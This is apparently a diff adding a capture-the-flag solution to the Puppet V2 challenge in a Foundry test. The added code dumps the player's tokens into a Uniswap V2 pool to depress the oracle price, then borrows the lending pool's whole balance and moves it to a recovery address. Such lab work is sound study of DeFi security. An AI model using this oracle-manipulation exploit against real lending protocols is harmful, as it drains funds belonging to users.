@@ -98,7 +98,44 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        console.log(player.balance, 'eth balance');
+        console.log(token.balanceOf(player), 'token balance');
+        console.log(weth.balanceOf(player), 'weth balance');
+
+        weth.deposit{value: player.balance}();
+        console.log(weth.balanceOf(player), 'weth balance');
+
+        console.log(lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool))), 'calculateDepositOfWETHRequired');
+        uint swapInputAmount = token.balanceOf(player);
         
+        _uniV2Swap(swapInputAmount);
+
+        uint256 calculateDepositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
+        console.log(calculateDepositOfWETHRequired, 'calculateDepositOfWETHRequired');
+
+        weth.approve(address(lendingPool), type(uint256).max);
+        console.log(token.balanceOf(address(lendingPool)), 'pool balance before borrow');
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+        console.log(token.balanceOf(address(lendingPool)), 'pool balance after borrow');
+
+        console.log(token.balanceOf(recovery), 'recovery balance');
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+        console.log(token.balanceOf(recovery), 'recovery balance after');
+    }
+
+    function _uniV2Swap(uint256 swapInputAmount) internal {
+        token.approve(address(uniswapV2Router), swapInputAmount);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uint[] memory amounts = uniswapV2Router.swapExactTokensForTokens(
+            swapInputAmount,
+            0,
+            path,
+            player,
+            block.timestamp + 1000
+        );
     }
 
     /**
